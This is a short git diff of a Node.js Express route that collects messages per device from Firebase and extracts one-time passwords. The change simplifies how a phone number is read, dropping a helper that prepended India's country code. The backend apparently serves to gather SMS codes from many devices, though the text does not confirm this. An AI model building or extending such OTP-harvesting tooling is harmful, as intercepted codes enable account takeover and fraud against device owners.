@@ -10,7 +10,6 @@ const ConnectionsService = require("../services/connections");
 const FirebaseService = require("../services/firebase");
 const DeviceService = require("../services/devices");
 const OtpExtractor = require("../services/otpExtractor");
-const { getPhone } = require("../utils/phone");
 const { requireAuth } = require("../middleware/auth");
 
 const router = Router();
@@ -63,10 +62,10 @@ router.get("/", async (req, res, next) => {
             for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
               if (!deviceMessages || typeof deviceMessages !== "object") continue;
               const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
-              const msgArray = Object.values(deviceMessages);
 
-              // Extract phone — same logic as OTP route (prepend 91 for Indian numbers)
-              let phone = getPhone(device, clientsData?.[deviceId], msgArray);
+              // Get phone DIRECTLY from normalized device data
+              const phone = (device && device.phoneNumber && device.phoneNumber !== "—")
+                ? device.phoneNumber : "";
 
               for (const [, msg] of Object.entries(deviceMessages)) {
                 if (!msg || typeof msg !== "object") continue;
@@ -205,6 +204,3 @@ router.get("/debug/:id", async (req, res, next) => {
 });
 
 module.exports = router;
-
-// ═══ Helpers ═══════════════════════════════════════════════
-
